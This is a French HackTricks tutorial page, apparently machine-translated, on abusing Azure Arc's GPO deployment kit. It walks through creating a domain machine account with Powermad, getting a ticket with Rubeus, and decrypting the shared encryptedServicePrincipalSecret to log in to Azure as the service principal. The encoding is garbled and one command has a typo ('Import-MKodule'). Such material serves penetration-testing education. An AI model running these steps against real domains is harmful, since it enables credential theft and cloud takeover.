# Az - Arc script de d√©ploiement GPO vuln√©rable

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

### Identification des probl√®mes

Azure Arc permet l'int√©gration de nouveaux serveurs internes (serveurs de domaine joints) dans Azure Arc en utilisant la m√©thode de l'objet de strat√©gie de groupe. Pour faciliter cela, Microsoft fournit un kit d'outils de d√©ploiement n√©cessaire pour initier la proc√©dure d'int√©gration. Dans le fichier ArcEnableServerGroupPolicy.zip, les scripts suivants peuvent √™tre trouv√©s : DeployGPO.ps1, EnableAzureArc.ps1 et AzureArcDeployment.psm1.

Lors de son ex√©cution, le script DeployGPO.ps1 effectue les actions suivantes :

1. Cr√©e le GPO d'int√©gration des serveurs Azure Arc dans le domaine local.
2. Copie le script d'int√©gration EnableAzureArc.ps1 dans le partage r√©seau d√©sign√© cr√©√© pour le processus d'int√©gration, qui contient √©galement le package d'installation Windows.

Lors de l'ex√©cution de ce script, les administrateurs syst√®me doivent fournir deux param√®tres principaux : **ServicePrincipalId** et **ServicePrincipalClientSecret**. De plus, il n√©cessite d'autres param√®tres tels que le domaine, le FQDN du serveur h√©bergeant le partage et le nom du partage. D'autres d√©tails tels que l'ID de locataire, le groupe de ressources et d'autres informations n√©cessaires doivent √©galement √™tre fournis au script.

Un secret chiffr√© est g√©n√©r√© dans le r√©pertoire AzureArcDeploy sur le partage sp√©cifi√© en utilisant le chiffrement DPAPI-NG. Le secret chiffr√© est stock√© dans un fichier nomm√© encryptedServicePrincipalSecret. Des preuves de cela peuvent √™tre trouv√©es dans le script DeployGPO.ps1, o√π le chiffrement est effectu√© en appelant ProtectBase64 avec $descriptor et $ServicePrincipalSecret comme entr√©es. Le descripteur se compose des SID des groupes Domain Computer et Domain Controller, garantissant que le ServicePrincipalSecret ne peut √™tre d√©chiffr√© que par les groupes de s√©curit√© Domain Controllers et Domain Computers, comme not√© dans les commentaires du script.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

Nous avons les conditions suivantes :

1. Nous avons r√©ussi √† p√©n√©trer le r√©seau interne.
2. Nous avons la capacit√© de cr√©er ou de prendre le contr√¥le d'un compte d'ordinateur au sein d'Active Directory.
3. Nous avons d√©couvert un partage r√©seau contenant le r√©pertoire AzureArcDeploy.

Il existe plusieurs m√©thodes pour obtenir un compte machine dans un environnement AD. L'une des plus courantes consiste √† exploiter le quota de compte machine. Une autre m√©thode implique de compromettre un compte machine via des ACL vuln√©rables ou diverses autres mauvaises configurations.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Une fois qu'un compte machine est obtenu, il est possible de s'authentifier en utilisant ce compte. Nous pouvons soit utiliser la commande runas.exe avec le drapeau netonly, soit utiliser pass-the-ticket avec Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
En ayant le TGT pour notre compte d'ordinateur stock√© en m√©moire, nous pouvons utiliser le script suivant pour d√©chiffrer le secret du principal de service.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Alternativement, nous pouvons utiliser [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

√Ä ce stade, nous pouvons rassembler les informations restantes n√©cessaires pour se connecter √† Azure √† partir du fichier ArcInfo.json, qui est stock√© sur le m√™me partage r√©seau que le fichier encryptedServicePrincipalSecret. Ce fichier contient des d√©tails tels que : TenantId, servicePrincipalClientId, ResourceGroup, et plus encore. Avec ces informations, nous pouvons utiliser Azure CLI pour nous authentifier en tant que service principal compromis.

## R√©f√©rences

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
